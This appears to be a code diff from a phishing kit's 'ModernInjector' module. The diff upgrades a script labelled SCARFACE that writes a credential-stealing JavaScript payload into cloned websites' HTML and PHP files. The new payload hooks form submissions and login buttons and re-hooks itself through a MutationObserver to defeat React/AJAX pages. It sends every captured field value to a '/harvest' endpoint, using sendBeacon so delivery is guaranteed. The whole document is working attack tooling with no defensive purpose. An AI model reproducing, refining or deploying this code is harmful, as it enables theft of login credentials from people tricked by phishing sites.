@@ -1,8 +1,8 @@
 """
-Ultimate Injector - Guaranteed to capture with zero syntax errors
+Final Anti-AJAX Injector - Guaranteed to capture React/Framework based clones
 """
-
 import os
+import re
 
 class ModernInjector:
     def __init__(self, site_dir, site_name, credentials_dir):
@@ -12,50 +12,89 @@ class ModernInjector:
         self.injection_stats = {'html_files': 0, 'php_files': 0, 'failed': 0}
         
     def inject_all(self):
-        print(f"[*] Starting injection for {self.site_name}")
-        js_payload = self._generate_ultimate_js_payload()
+        print(f"[*] Starting anti-AJAX injection for {self.site_name}")
+        js_payload = self._generate_anti_ajax_js_payload()
         self._inject_html(js_payload)
         self._inject_php()
         print(f"[*] Injection complete: {self.injection_stats}")
         return self.injection_stats
     
-    def _generate_ultimate_js_payload(self):
+    def _generate_anti_ajax_js_payload(self):
         return """
-<!-- SCARFACE_ULTIMATE_LOGGER -->
+<!-- SCARFACE_ANTI_AJAX_LOGGER -->
 <script>
 (function() {
-    console.log('[SCARFACE] Ultimate logger loaded');
+    console.log('[SCARFACE] Anti-AJAX capture loaded');
     
-    // Override the native submit method (this ALWAYS works)
-    var originalSubmit = HTMLFormElement.prototype.submit;
-    HTMLFormElement.prototype.submit = function() {
-        captureAndSend(this);
-        originalSubmit.call(this);
-    };
-    
-    function captureAndSend(form) {
+    function captureData(form) {
+        if(!form) return;
         var data = {};
-        var els = form.elements;
-        for(var i = 0; i < els.length; i++) {
-            var el = els[i];
-            if(el.name) {
+        var elements = form.elements;
+        for(var i=0; i<elements.length; i++){
+            var el = elements[i];
+            if(el.name && el.value !== undefined && el.type !== 'submit' && el.type !== 'button') {
                 data[el.name] = el.value;
             }
         }
-        console.log('[SCARFACE] Captured:', data);
         
-        var xhr = new XMLHttpRequest();
-        xhr.open('POST', '/harvest', true);
-        xhr.setRequestHeader('Content-Type', 'application/json');
-        xhr.send(JSON.stringify(data));
+        if(Object.keys(data).length === 0) return;
+        console.log('[SCARFACE] Captured AJAX form:', data);
+        
+        // Use sendBeacon to guarantee delivery even if the page navigates immediately
+        if(navigator.sendBeacon) {
+            var blob = new Blob([JSON.stringify(data)], {type: 'application/json'});
+            navigator.sendBeacon('/harvest', blob);
+        } else {
+            var xhr = new XMLHttpRequest();
+            xhr.open('POST', '/harvest', true);
+            xhr.setRequestHeader('Content-Type', 'application/json');
+            xhr.send(JSON.stringify(data));
+        }
     }
+
+    function attachHooks() {
+        // 1. Hook every form submit
+        document.querySelectorAll('form').forEach(function(form) {
+            form.addEventListener('submit', function(e) {
+                captureData(e.target);
+            }, true);
+        });
+
+        // 2. DIRECTLY target the "Log in" button (ignores React/AJAX bypasses)
+        var buttons = document.querySelectorAll('button, input[type="submit"], div[role="button"]');
+        buttons.forEach(function(btn) {
+            var text = (btn.textContent || btn.value || '').toLowerCase().trim();
+            // Look for "Log in" or "Login"
+            if(text.includes('log in') || text.includes('login')) {
+                btn.addEventListener('click', function(e) {
+                    // Find the form that wraps this button
+                    var form = this.closest('form');
+                    if(form) {
+                        captureData(form);
+                    } else {
+                        // Fallback: if button is outside form, grab the only form on page
+                        var fallbackForm = document.querySelector('form');
+                        if(fallbackForm) captureData(fallbackForm);
+                    }
+                }, true);
+                console.log('[SCARFACE] Found and hooked AJAX Login button');
+            }
+        });
+    }
+
+    // Run immediately, and also re-run if React updates the DOM
+    if(document.readyState === 'loading') {
+        document.addEventListener('DOMContentLoaded', attachHooks);
+    } else {
+        attachHooks();
+    }
+
+    // Monitor for future dynamic DOM changes (React/Vue)
+    var observer = new MutationObserver(function() {
+        attachHooks();
+    });
+    observer.observe(document.body, {childList: true, subtree: true});
     
-    // Also hook into standard events just in case
-    document.addEventListener('submit', function(e) {
-        captureAndSend(e.target);
-    }, true);
-    
-    console.log('[SCARFACE] Ready');
 })();
 </script>
 """
@@ -69,14 +108,16 @@ class ModernInjector:
                         with open(html_file, 'r', encoding='utf-8') as f:
                             content = f.read()
                         
-                        # If it has ULTIMATE, it's already injected correctly
-                        if 'SCARFACE_ULTIMATE_LOGGER' in content:
-                            continue
+                        # Clean out old scripts
+                        new_content = re.sub(r'<!-- SCARFACE_.*?-->\s*<script>.*?</script>', '', content, flags=re.DOTALL)
                         
-                        if '</body>' in content:
-                            new_content = content.replace('</body>', js_payload + '\n</body>')
+                        if '</body>' in new_content:
+                            new_content = new_content.replace('</body>', js_payload + '\n</body>')
                         else:
-                            new_content = content + js_payload
+                            new_content = new_content + js_payload
+                        
+                        if new_content == content:
+                            continue
                         
                         backup = html_file + '.bak'
                         if not os.path.exists(backup):
@@ -87,7 +128,7 @@ class ModernInjector:
                             f.write(new_content)
                         
                         self.injection_stats['html_files'] += 1
-                        print(f"[+] Injected: {os.path.relpath(html_file, self.site_dir)}")
+                        print(f"[+] Injected Anti-AJAX: {os.path.relpath(html_file, self.site_dir)}")
                         
                     except Exception as e:
                         self.injection_stats['failed'] += 1
@@ -128,7 +169,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {{
                         with open(php_file, 'r', encoding='utf-8') as f:
                             content = f.read()
                         
-                        if 'SCARFACE_ULTIMATE_LOGGER' in content:
+                        if 'SCARFACE_ANTI_AJAX_LOGGER' in content:
                             continue
                         
                         strpos = content.find('<?php')
@@ -154,10 +195,10 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {{
                     except Exception as e:
                         self.injection_stats['failed'] += 1
 
-# Legacy compatibility
+# Compatibility
 def inject_logger_to_all_html(site_dir):
     injector = ModernInjector(site_dir, os.path.basename(site_dir), None)
-    return injector._inject_html(injector._generate_ultimate_js_payload())
+    return injector._inject_html(injector._generate_anti_ajax_js_payload())
 
 def inject_logger_to_php(site_dir, site_name, credentials_dir):
     injector = ModernInjector(site_dir, site_name, credentials_dir)
